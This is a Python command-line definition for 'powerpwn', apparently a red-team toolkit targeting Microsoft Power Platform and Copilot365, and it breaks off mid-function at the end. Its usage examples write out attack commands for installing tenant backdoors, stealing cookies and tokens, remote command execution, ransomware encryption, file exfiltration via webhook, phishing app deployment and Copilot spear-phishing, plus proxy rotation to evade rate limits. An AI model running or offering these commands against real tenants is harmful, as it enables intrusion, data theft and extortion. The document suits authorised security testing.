from __future__ import annotations

import argparse
import logging
from typing import TYPE_CHECKING, Iterable

from powerpwn.copilot.enums.copilot_scenario_enum import CopilotScenarioEnum
from powerpwn.copilot.enums.verbose_enum import VerboseEnum
from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
from powerpwn.powerdoor.enums.action_type import BackdoorActionType
from powerpwn.powerdump.utils.const import CACHE_PATH

if TYPE_CHECKING:
    from argparse import _SubParsersAction


# Command categories for organized help output
TENANT_OPERATIONS = {
    "dump": "Dump content for all available connections from recon on a tenant",
    "recon": "Recon a tenant for available data connections",
    "tenant-mcp-recon": "Discover MCP server URLs from a tenant's collected connector resources and enumerate their capabilities",
    "gui": "Show collected resources and data from a recon on a tenant via GUI",
    "backdoor": "Install a backdoor on a target tenant",
    "nocodemalware": "Repurpose trusted services and cloud services to power a malware operation",
    "phishing": "Deploy a trustworthy phishing app on a target tenant",
    "copilot": "Connects and interacts programmatically with Copilot365 within Office/Teams",
}

RECON_DISCOVERY = {
    "llm-hound": "Discover AI integration surfaces: Claude/OpenAI APIs, MCP servers, LLM proxies and enumerate their capabilities",
    "custom-gpt-hunter": "Discover Custom GPTs on ChatGPT and enumerate their capabilities (requires a valid ChatGPT account)",
    "agent-builder-hunter": "Discover OpenAI Agent Builder deployments in the wild and enumerate their capabilities",
    "copilot-studio-hunter": "Discover Copilot Studio bots and enumerate their capabilities",
    "powerpages": "Test anonymous access to Dataverse tables via Power Pages",
}


class GroupedCommandHelpFormatter(argparse.RawDescriptionHelpFormatter):
    """Custom formatter that groups commands into categories."""

    def _format_usage(
        self, usage: str | None, actions: Iterable[argparse.Action], groups: Iterable[argparse._ArgumentGroup], prefix: str | None
    ) -> str:
        # Get the default usage string
        if prefix is None:
            prefix = "usage: "

        # If we have subparsers, simplify the usage line
        prog = "%(prog)s" if usage is None else usage
        for action in actions:
            if isinstance(action, argparse._SubParsersAction):
                # Create a cleaner usage line without listing all subcommands
                usage_parts = [prog, "[options]", "{command}"]
                usage_str = " ".join(usage_parts)
                return f"{prefix}{usage_str % {'prog': self._prog}}\n\n"

        # Fall back to default formatting for other cases
        return super()._format_usage(usage, actions, groups, prefix)

    def _format_action(self, action: argparse.Action) -> str:
        # Only customize the subparsers action
        if isinstance(action, argparse._SubParsersAction):
            parts = []
            parts.append("\n")

            # Tenant Operations
            parts.append("TEST YOURSELF AS AN INSIDER (requires at least guest user authentication to access the MSFT tenant):\n")
            for cmd_name in TENANT_OPERATIONS:
                if cmd_name in action.choices:
                    help_text = TENANT_OPERATIONS[cmd_name]
                    parts.append(f"  {cmd_name:<20}  {help_text}\n")

            parts.append("\n")

            # Reconnaissance & Discovery
            parts.append("TEST YOURSELF AS AN OUTSIDER (focused and broad scanning of AI & LCNC resources):\n")
            for cmd_name in RECON_DISCOVERY:
                if cmd_name in action.choices:
                    help_text = RECON_DISCOVERY[cmd_name]
                    parts.append(f"  {cmd_name:<20}  {help_text}\n")

            return "".join(parts)

        return super()._format_action(action)


def module_gui(sub_parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    gui_parser = sub_parser.add_parser(
        "gui",
        description="Show collected resources and data from a recon on a tenant.",
        help="Show collected resources and data from a recon on a tenant via GUI.",
        epilog="""
Examples:
  powerpwn gui -t <tenant-id>
  powerpwn gui --cache-path /custom/path
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    gui_parser.add_argument("--cache-path", default=CACHE_PATH, type=str, help="Path to cached resources.")
    gui_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to launch gui.")


def module_dump(sub_parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    dump_parser = sub_parser.add_parser(
        "dump",
        description="Dump content for all available connections from a recon on a tenant.",
        help="Dump content for all available connection from recon on a tenant.",
        epilog="""
Examples:
  powerpwn dump -t <tenant-id>
  powerpwn dump -t <tenant-id> -g
  powerpwn dump -t <tenant-id> -r -g
  powerpwn dump -c --cache-path /custom/path
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    dump_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
    dump_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
    dump_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
    dump_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")
    dump_parser.add_argument("-r", "--recon", action="store_true", help="Run recon before dump. Should be used if recon command was not run before.")


def module_recon(sub_parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    dump_parser = sub_parser.add_parser(
        "recon",
        description="Recon a tenant for available data connections.",
        help="Recon a tenant for available data connections.",
        epilog="""
Examples:
  powerpwn recon -t <tenant-id>
  powerpwn recon -t <tenant-id> -g
  powerpwn recon -c
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    dump_parser.add_argument("-c", "--clear-cache", action="store_true", help="Clear local disk cache")
    dump_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to store collected resources and data.")
    dump_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
    dump_parser.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")


def module_tenant_mcp_recon(sub_parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    mcp_recon_parser = sub_parser.add_parser(
        "tenant-mcp-recon",
        description="Discover MCP server URLs from a tenant's collected connector resources and enumerate their capabilities",
        help="Discover MCP server URLs from a tenant's collected connector resources and enumerate their capabilities.",
        epilog="""
Examples:
  powerpwn tenant-mcp-recon -t <tenant-id>
  powerpwn tenant-mcp-recon -t <tenant-id> -o mcp_results.json
  powerpwn tenant-mcp-recon -t <tenant-id> -r
  powerpwn tenant-mcp-recon -t <tenant-id> --no-probe
  powerpwn tenant-mcp-recon -t <tenant-id> --urls-only -o urls.txt
  powerpwn tenant-mcp-recon -t <tenant-id> --timeout 30 --max-concurrent 10
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    mcp_recon_parser.add_argument("--cache-path", default=CACHE_PATH, help="Path to collected resources and data.")
    mcp_recon_parser.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to scan.")
    mcp_recon_parser.add_argument(
        "-o",
        "--output",
        required=False,
        type=str,
        help="Output file path for MCP server results (JSON with probe data by default, or TXT if --no-probe or --urls-only).",
    )
    mcp_recon_parser.add_argument(
        "-r", "--recon", action="store_true", help="Run recon before MCP scan. Should be used if recon command was not run before."
    )
    mcp_recon_parser.add_argument("--no-probe", action="store_true", help="Skip probing discovered MCP servers (default: auto-probe).")
    mcp_recon_parser.add_argument(
        "--urls-only",
        action="store_true",
        help="Save only server URLs (simple text format) instead of detailed JSON - ideal for piping to probe command.",
    )
    mcp_recon_parser.add_argument("--timeout", type=int, default=15, help="Timeout for probing MCP servers in seconds (default: 15).")
    mcp_recon_parser.add_argument("--max-concurrent", type=int, default=5, help="Maximum concurrent probe connections (default: 5).")


def module_nocodemalware(command_subparsers: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    nocodemalware_parser = command_subparsers.add_parser(
        "nocodemalware",
        description="Repurpose trusted execs, service accounts and cloud services to power a malware operation",
        help="Repurpose trusted execs, service accounts and cloud services to power a malware operation.",
        epilog="""
Examples:
  powerpwn nocodemalware -w <webhook-url> steal-cookie --fqdn example.com
  powerpwn nocodemalware -w <webhook-url> command-exec -t cmd -c "whoami"
  powerpwn nocodemalware -w <webhook-url> exfiltrate -f /path/to/file
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    nocodemalware_parser.add_argument(
        "-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform"
    )
    nocodemalware_subparsers = nocodemalware_parser.add_subparsers(help="nocodemalware_subcommand", dest="nocodemalware_subcommand")

    module_nocodemalware_subcommand_exec(nocodemalware_subparsers)


def module_nocodemalware_subcommand_exec(command_subparsers: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    steal_fqdn_parser = command_subparsers.add_parser(
        "steal-cookie",
        description="Steal cookie of fqdn",
        epilog="""
Examples:
  powerpwn nocodemalware -w <webhook-url> steal-cookie --fqdn example.com
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    steal_fqdn_parser.add_argument("--fqdn", required=True, type=str, help="Fully qualified domain name to fetch the cookies of")

    command_subparsers.add_parser(
        "steal-power-automate-token",
        description="Steal power automate token",
        epilog="""
Examples:
  powerpwn nocodemalware -w <webhook-url> steal-power-automate-token
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    execute_command_parser = command_subparsers.add_parser(
        "command-exec",
        description="Execute command on machine",
        epilog="""
Examples:
  powerpwn nocodemalware -w <webhook-url> command-exec -t cmd -c "whoami"
  powerpwn nocodemalware -w <webhook-url> command-exec -t powershell -c "Get-Process"
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    execute_command_parser.add_argument(
        "-t", "--type", required=True, type=str, choices=[cmd_type.value for cmd_type in CodeExecTypeEnum], help="Command type"
    )
    execute_command_parser.add_argument("-c", "--command-to-execute", required=True, type=str, help="Command to execute")

    ransomware_parser = command_subparsers.add_parser(
        "ransomware",
        description="Ransomware",
        epilog="""
Examples:
  powerpwn nocodemalware -w <webhook-url> ransomware --crawl_depth 3 -k mykey123 --dirs "C:\\\\Users,D:\\\\Data"
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ransomware_parser.add_argument("--crawl_depth", required=True, type=str, help="Recursively search into subdirectories this many times")
    ransomware_parser.add_argument(
        "-k", "--encryption-key", required=True, type=str, help="an encryption key used to encrypt each file identified (AES256)"
    )
    ransomware_parser.add_argument(
        "--dirs", required=True, type=str, help="A list of directories to begin crawl from separated by a comma (e.g.'C:\\,D:\\')"
    )

    exfiltrate_file_parser = command_subparsers.add_parser(
        "exfiltrate",
        description="Exfiltrate file",
        epilog="""
Examples:
  powerpwn nocodemalware -w <webhook-url> exfiltrate -f C:\\\\Users\\\\user\\\\secrets.txt
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    exfiltrate_file_parser.add_argument("-f", "--file", required=True, type=str, help="Absolute path to file")

    command_subparsers.add_parser(
        "cleanup",
        description="Cleanup",
        epilog="""
Examples:
  powerpwn nocodemalware -w <webhook-url> cleanup
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )


def module_backdoor(command_subparsers: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    backdoor_parser = command_subparsers.add_parser(
        "backdoor",
        description="Install a backdoor on a target tenant.",
        help="Install a backdoor on a target tenant.",
        epilog="""
Examples:
  powerpwn backdoor -e <env-id> install-factory -c <connection-id>
  powerpwn backdoor -e <env-id> get-connections -w <webhook-url>
  powerpwn backdoor -e <env-id> create-flow -w <webhook-url> -i flow.json
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    backdoor_parser.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id in powerplatform.")
    backdoor_subparsers = backdoor_parser.add_subparsers(help="backdoor_subcommand", dest="backdoor_subcommand")

    ## Delete Flow parser ##
    delete_flow_parser = backdoor_subparsers.add_parser(
        BackdoorActionType.delete_flow.value,
        description="Deletes flow.",
        help="Deletes flow using installed backdoor flow.",
        epilog="""
Examples:
  powerpwn backdoor -e <env-id> delete-flow -w <webhook-url> -f <flow-id>
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    delete_flow_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
    delete_flow_parser.add_argument("-f", "--flow-id", type=str, help="Flow id to delete.")

    ## Create Flow parser ##
    create_flow_parser = backdoor_subparsers.add_parser(
        BackdoorActionType.create_flow.value,
        description="Creates a flow.",
        help="Creates a flow using installed backdoor flow.",
        epilog="""
Examples:
  powerpwn backdoor -e <env-id> create-flow -w <webhook-url> -i flow_details.json
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    create_flow_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
    create_flow_parser.add_argument("-i", "--input", type=str, required=True, help="Path to flow details input file.")

    ## Get connections parser ##
    get_connections_parser = backdoor_subparsers.add_parser(
        BackdoorActionType.get_connections.value,
        description="Get connections",
        help="Gets connections details in environment",
        epilog="""
Examples:
  powerpwn backdoor -e <env-id> get-connections -w <webhook-url>
  powerpwn backdoor -e <env-id> get-connections -w <webhook-url> -o connections.json
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    get_connections_parser.add_argument(
        "-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform"
    )
    get_connections_parser.add_argument("-o", "--output", type=str, default="", help="Path to output file.")

    ## backdoor installer parser ##
    installer = backdoor_subparsers.add_parser(
        BackdoorActionType.install_factory.value,
        description="Install flow factory",
        help="Installs flow factory in powerplatform",
        epilog="""
Examples:
  powerpwn backdoor -e <env-id> install-factory -c <connection-id>
  powerpwn backdoor -e <env-id> install-factory -c <connection-id> -t <tenant-id>
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    installer.add_argument("-c", "--connection-id", required=True, type=str, help="The connection id of management connection")
    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")


def module_phishing(command_subparsers: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    phishing = command_subparsers.add_parser(
        "phishing",
        description="Deploy a trustworthy phishing app on a target tenant.",
        help="Deploy a trustworthy phishing app on a target tenant.",
        epilog="""
Examples:
  powerpwn phishing install-app -i app.zip -n "MyApp" -e <env-id>
  powerpwn phishing share-app -a <app-id> -e <env-id> -t <tenant-id>
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    phishing_subparsers = phishing.add_subparsers(help="phishing_subcommand", dest="phishing_subcommand")

    installer = phishing_subparsers.add_parser(
        "install-app",
        description="Installs phishing app.",
        help="Installs a phishing app in the target environment.",
        epilog="""
Examples:
  powerpwn phishing install-app -i phishing_app.zip -n "Corporate Portal" -e <env-id>
  powerpwn phishing install-app -i app.zip -t <tenant-id> -n "HR Portal" -e <env-id>
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    installer.add_argument("-i", "--input", type=str, required=True, help="Path to app package zip file.")
    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
    installer.add_argument("-n", "--app-name", required=True, type=str, help="Display name of the app.")
    installer.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id to install the app in.")

    app_share = phishing_subparsers.add_parser(
        "share-app",
        description="Share app with organization",
        help="Share app with organization",
        epilog="""
Examples:
  powerpwn phishing share-app -a <app-id> -e <env-id> -t <tenant-id>
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    app_share.add_argument("-a", "--app-id", required=True, type=str, help="App id to share")
    app_share.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id that the app belongs to.")
    app_share.add_argument("-t", "--tenant", required=True, type=str, help="Tenant id to connect.")


def module_copilot(command_subparsers: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    copilot = command_subparsers.add_parser(
        "copilot",
        description="Connects and interacts programmatically with Copilot365 within Office/Teams.",
        help="Connects and interacts programmatically with Copilot365 within Office/Teams.",
        epilog="""
Examples:
  powerpwn copilot chat -u user@example.com -s <scenario>
  powerpwn copilot whoami -u user@example.com -s <scenario>
  powerpwn copilot dump -u user@example.com -s <scenario> -d /path/to/output
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_subparsers = copilot.add_subparsers(help="copilot_subcommand", dest="copilot_subcommand")

    interactive_chat = copilot_subparsers.add_parser(
        "chat",
        description="Starts an interactive chat with Copilot365 within Office/Teams.",
        help="Connects to Copilot365 and starts an interactive chat session.",
        epilog="""
Examples:
  powerpwn copilot chat -u user@example.com -s office
  powerpwn copilot chat -u user@example.com -p password -s teams -v verbose
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_modules(interactive_chat)

    spearphishing = copilot_subparsers.add_parser(
        "spear-phishing",
        description="Starts a spearphishing using copilot",
        help="Targets a compromised user's collaborators and crafts personalized emails using copilot",
        epilog="""
Examples:
  powerpwn copilot spear-phishing -u user@example.com -s office
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_modules(spearphishing)

    whoami = copilot_subparsers.add_parser(
        "whoami",
        description="Get the current user's information",
        help="Get the current user's information",
        epilog="""
Examples:
  powerpwn copilot whoami -u user@example.com -s office
  powerpwn copilot whoami -u user@example.com -s teams -g
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_modules(whoami)
    whoami.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")

    dump = copilot_subparsers.add_parser(
        "dump",
        description="Data dump using recon from whoami command",
        help="Dump of documents, emails, and other data from the recon of whoami command",
        epilog="""
Examples:
  powerpwn copilot dump -u user@example.com -s office -d /path/to/output
  powerpwn copilot dump -u user@example.com -s teams -d /path/to/output -g
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_modules(dump)
    dump.add_argument("-d", "--directory", type=str, required=True, help="Path to whoami output directory")
    dump.add_argument("-g", "--gui", action="store_true", help="Run local server for gui.")

    gui = copilot_subparsers.add_parser(
        "gui",
        description="Browse data in a local server",
        help="Browse collected data in a simple gui on a local server",
        epilog="""
Examples:
  powerpwn copilot gui -d /path/to/data
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    gui.add_argument("-d", "--directory", type=str, required=True, help="Data directory")


def copilot_modules(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("-u", "--user", required=True, type=str, help="User email to connect.")
    parser.add_argument("-p", "--password", required=False, type=str, help="User password to connect.")
    parser.add_argument("--cached-token", action="store_true", help="Use cached access token to connect to copilot if exists.")
    parser.add_argument(
        "-s", "--scenario", required=True, type=str, choices=[scenario_type.value for scenario_type in CopilotScenarioEnum], help="Scenario to run."
    )

    parser.add_argument(
        "-v",
        "--verbose",
        required=False,
        type=str,
        default=VerboseEnum.off.value,
        choices=[verbose_level.value for verbose_level in VerboseEnum],
        help="Verbose level. Default is off.",
    )


def module_copilot_studio(command_subparsers: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    copilot = command_subparsers.add_parser(
        "copilot-studio-hunter",
        description="Scan, enumerate and recon Copilot Studio bots.",
        help="Scan, enumerate and recon Copilot Studio bots.",
        epilog="""
Examples:
  powerpwn copilot-studio-hunter deep-scan -d example.com
  powerpwn copilot-studio-hunter tools-recon -u https://example.com/bot
  powerpwn copilot-studio-hunter enum -e tenant
  powerpwn copilot-studio-hunter get-tenant -d example.com
  powerpwn copilot-studio-hunter check-accessible -i bot_urls.txt --check-knowledge
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_subparsers = copilot.add_subparsers(help="copilot_studio_subcommand", dest="copilot_studio_subcommand")

    deep_scan = copilot_subparsers.add_parser(
        "deep-scan",
        description="Starts a recon deep scan based on a domain/tenant/environment. Requires FFUF to be installed. Automatically tests discovered bots for attached knowledge sources. For best results on domain/tenant/environment scans, use a rotating proxy to avoid IP-based rate limiting on Power Platform API endpoints.",
        help="Starts a recon deep scan based on a domain/tenant/environment. Requires FFUF to be installed. Automatically tests discovered bots for attached knowledge sources.",
        epilog="""
Examples:
  powerpwn copilot-studio-hunter deep-scan -d example.com -r 1 -t 20
  powerpwn copilot-studio-hunter deep-scan -i Default-12345678-1234-1234-1234-123456789012
  powerpwn copilot-studio-hunter deep-scan -e <env-id> -x http://proxy:8080
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_studio_modules(deep_scan, "deep-scan")

    tools_recon = copilot_subparsers.add_parser(
        "tools-recon",
        description="Starts a recon scan for tools based on a url or a list of urls in a file.",
        help="Starts a recon scan for tools based on a url or a list of urls in a file.",
        epilog="""
Examples:
  powerpwn copilot-studio-hunter tools-recon -u https://example.com/bot
  powerpwn copilot-studio-hunter tools-recon -i bot_urls.txt
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_studio_modules(tools_recon, "tools-recon")

    enum = copilot_subparsers.add_parser(
        "enum",
        description="Starts enumerating for Azure tenant IDs or environments IDs.  Requires subfinder to be installed.",
        help="Starts enumerating for Azure tenant IDs or environments IDs. Requires subfinder to be installed.",
        epilog="""
Examples:
  powerpwn copilot-studio-hunter enum -e tenant
  powerpwn copilot-studio-hunter enum -e environment -t 600
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_studio_modules(enum, "enum")

    get_tenant = copilot_subparsers.add_parser(
        "get-tenant",
        description="Retrieve Azure AD tenant ID from a domain name.",
        help="Get the tenant ID for a given domain.",
        epilog="""
Examples:
  powerpwn copilot-studio-hunter get-tenant -d example.com
  powerpwn copilot-studio-hunter get-tenant -d contoso.com --timeout 20
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_studio_modules(get_tenant, "get-tenant")

    check_accessible = copilot_subparsers.add_parser(
        "check-accessible",
        description="Check if Copilot Studio bots are accessible and optionally test for knowledge sources.",
        help="Check if Copilot Studio bots are accessible and optionally test for knowledge sources.",
        epilog="""
Examples:
  powerpwn copilot-studio-hunter check-accessible -u https://copilotstudio.microsoft.com/environments/env-id/bots/bot-name/canvas
  powerpwn copilot-studio-hunter check-accessible -i bot_urls.txt
  powerpwn copilot-studio-hunter check-accessible -i bot_urls.txt --check-knowledge
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    copilot_studio_modules(check_accessible, "check-accessible")


def copilot_studio_modules(parser: argparse.ArgumentParser, module: str) -> None:

    if module == "deep-scan":
        parser.add_argument("-r", "--rate", type=int, default=0, help="Rate limit in seconds between FFUF requests. Default is 0.")
        parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent FFUF threads. Default is 10.")
        parser.add_argument("--mode", choices=["verbose", "silent"], default="-s", help="Choose between verbose (-v) and silent (-s) mode for FFUF.")
        parser.add_argument(
            "-tp", "--timeout_prefix", help="The timeout for the solution prefix scan to have (in seconds). Default is half an hour.", default=1800
        )
        parser.add_argument(
            "-tb",
            "--timeout_bots",
            help="The timeout for each of the bot scans (one-word/two-word/three-word) to have (in seconds). Default is one hour.",
            default=3600,
        )
        parser.add_argument(
            "-x",
            "--proxy",
            type=str,
            help="Proxy URL for ffuf requests (e.g., http://127.0.0.1:8080). Useful for using rotating proxies to avoid IP-based rate limiting on Power Platform API endpoints.",
        )
        parser.add_argument(
            "-p", "--delay", type=float, default=0, help="Delay between requests in seconds (supports decimals, e.g., 0.5 for 500ms). Default is 0."
        )

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument("-d", "--domain", type=str, help="The domain to query for tenant ID and run FFUF on.")
        group.add_argument(
            "-i",
            "--tenant-id",
            type=str,
            help="The tenant ID to run FFUF on (format: Default-<guid>, e.g., Default-12345678-1234-1234-1234-123456789012). Can be provided with or without the 'Default-' prefix.",
        )
        group.add_argument("-e", "--environment-id", type=str, help="The environment ID to run FFUF on.")

    if module == "tools-recon":
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument("-u", "--url", type=str, help="The URL to query for tools")
        group.add_argument("-i", "--input-file", type=str, help="The path to an input file with a list of URLs to query for tools")

    if module == "enum":
        parser.add_argument("-e", "--enumerate", choices=["environment", "tenant"], help="Run the enumeration function on environment or tenant")
        parser.add_argument("-t", "--timeout", help="The timeout for the enumeration process to have (in seconds)", default=300)

    if module == "get-tenant":
        parser.add_argument("-d", "--domain", type=str, required=True, help="The domain to query for tenant ID (e.g., example.com or contoso.com)")
        parser.add_argument("--timeout", type=int, default=10, help="Timeout for the HTTP request in seconds (default: 10)")

    if module == "check-accessible":
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument("-u", "--url", type=str, help="A single bot URL to check for accessibility")
        group.add_argument("-i", "--input-file", type=str, help="Path to a file containing a list of bot URLs (one per line)")
        parser.add_argument("--check-knowledge", action="store_true", help="Also check accessible bots for knowledge sources (runs query_chat.js)")


def module_powerpages(parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    powerpages = parser.add_parser(
        "powerpages",
        description="Test anonymous access to dataverse tables via power pages, either via the apis or odata feeds.",
        help="Test anonymous access to dataverse tables via power pages, either via the apis or odata feeds.",
        epilog="""
Examples:
  powerpwn powerpages -url https://example.powerappsportals.com
  powerpwn powerpages -url https://myportal.powerappsportals.com
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    powerpages.add_argument(
        "-url",
        help="The url of the power pages domain to be tested. Format the url as such: 'https://<your_domain>.powerappsportals.com'",
        required=True,
    )


def module_llm_hound(parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    llm_hound = parser.add_parser(
        "llm-hound",
        description="Discover and recon AI integration surfaces including Claude/OpenAI APIs, Model Context Protocol (MCP) servers, LLM proxies, and API endpoints.",
        help="Discover and recon AI integration surfaces including Claude/OpenAI APIs, Model Context Protocol (MCP) servers, LLM proxies, and API endpoints.",
        epilog="""
Examples:
  powerpwn llm-hound list-filters
  powerpwn llm-hound discover -f azure_mcp_servers -m 50
  powerpwn llm-hound probe -u https://example.com/mcp
  powerpwn llm-hound mcp-registry-diving -m 100
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    llm_hound_subparsers = llm_hound.add_subparsers(help="llm_hound_subcommand", dest="llm_hound_subcommand")

    # List filters subcommand
    list_filters = llm_hound_subparsers.add_parser(
        "list-filters",
        description="List available Shodan discovery filters",
        help="List all available discovery filters",
        epilog="""
Examples:
  powerpwn llm-hound list-filters
  powerpwn llm-hound list-filters --filters-file custom_filters.json
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    list_filters.add_argument("--filters-file", type=str, help="Path to custom filters JSON file")

    # Discover subcommand
    discover = llm_hound_subparsers.add_parser(
        "discover",
        description="Discover AI integration surfaces using Shodan: Claude/OpenAI APIs, MCP servers, LLM proxies",
        help="Discover AI integration surfaces using Shodan search and optionally probe them",
        epilog="""
Examples:
  powerpwn llm-hound discover -k <shodan-api-key> -f azure_mcp_servers
  powerpwn llm-hound discover -k <shodan-api-key> -c protocol_based -m 50
  powerpwn llm-hound discover -k <shodan-api-key> -q "port:3000 mcp" -o results.json
  powerpwn llm-hound discover -f azure_mcp_servers --no-probe
  powerpwn llm-hound discover -f azure_mcp_servers --urls-only -o urls.txt
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    discover.add_argument("-k", "--api-key", required=False, type=str, help="Shodan API key (will prompt securely if not provided)")
    discover_group = discover.add_mutually_exclusive_group(required=True)
    discover_group.add_argument("-f", "--filter", type=str, help="Filter name to use (e.g., 'azure_mcp_servers')")
    discover_group.add_argument("-c", "--category", type=str, help="Category to search (e.g., 'protocol_based', 'infrastructure_based')")
    discover_group.add_argument("-q", "--query", type=str, help="Custom Shodan query")
    discover.add_argument("-m", "--max-results", type=int, default=100, help="Maximum results to fetch (default: 100)")
    discover.add_argument("-o", "--output", type=str, help="Output file for results (JSON with details by default, or TXT if --urls-only)")
    discover.add_argument("--filters-file", type=str, help="Path to custom filters JSON file")
    discover.add_argument("--no-probe", action="store_true", help="Skip probing discovered servers")
    discover.add_argument(
        "--urls-only",
        action="store_true",
        help="Save only server URLs (simple text format) instead of detailed JSON - ideal for piping to probe command",
    )
    discover.add_argument("--probe-timeout", type=int, default=15, help="Timeout for probing servers in seconds (default: 15)")
    discover.add_argument("--max-concurrent", type=int, default=5, help="Maximum concurrent probe connections (default: 5)")

    # Probe subcommand
    probe = llm_hound_subparsers.add_parser(
        "probe",
        description="Probe AI integration servers from a list or single URL for capabilities (MCP, Claude/OpenAI APIs, swagger endpoints)",
        help="Probe AI integration servers for capabilities",
        epilog="""
Examples:
  powerpwn llm-hound probe -u https://example.com/mcp
  powerpwn llm-hound probe -i urls.txt -o probe_results.json
  powerpwn llm-hound probe -u https://example.com/mcp --timeout 30
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    probe_input_group = probe.add_mutually_exclusive_group(required=True)
    probe_input_group.add_argument("-i", "--input", type=str, help="Input file with server URLs (one per line)")
    probe_input_group.add_argument("-u", "--url", type=str, help="Single server URL to probe")
    probe.add_argument("-o", "--output", type=str, help="Output file for probe results (JSON format)")
    probe.add_argument("--timeout", type=int, default=15, help="Timeout for probing in seconds (default: 15)")
    probe.add_argument("--max-concurrent", type=int, default=5, help="Maximum concurrent connections (default: 5)")

    # MCP Registry Diving subcommand
    registry_diving = llm_hound_subparsers.add_parser(
        "mcp-registry-diving",
        description="Discover MCP servers from the official MCP registry",
        help="Discover MCP servers from official MCP registry and optionally probe them",
        epilog="""
Examples:
  powerpwn llm-hound mcp-registry-diving -m 100
  powerpwn llm-hound mcp-registry-diving -o registry_servers.json
  powerpwn llm-hound mcp-registry-diving --no-probe -m 50
  powerpwn llm-hound mcp-registry-diving --urls-only -o registry_urls.txt
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    registry_diving.add_argument("-m", "--max-results", type=int, help="Maximum number of results to fetch (fetches all if not specified)")
    registry_diving.add_argument("-o", "--output", type=str, help="Output file for results (JSON with details by default, or TXT if --urls-only)")
    registry_diving.add_argument("--no-probe", action="store_true", help="Skip probing discovered servers")
    registry_diving.add_argument(
        "--urls-only",
        action="store_true",
        help="Save only server URLs (simple text format) instead of detailed JSON - ideal for piping to probe command",
    )
    registry_diving.add_argument("--probe-timeout", type=int, default=15, help="Timeout for probing servers in seconds (default: 15)")
    registry_diving.add_argument("--max-concurrent", type=int, default=5, help="Maximum concurrent probe connections (default: 5)")


def module_custom_gpt_hunter(parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
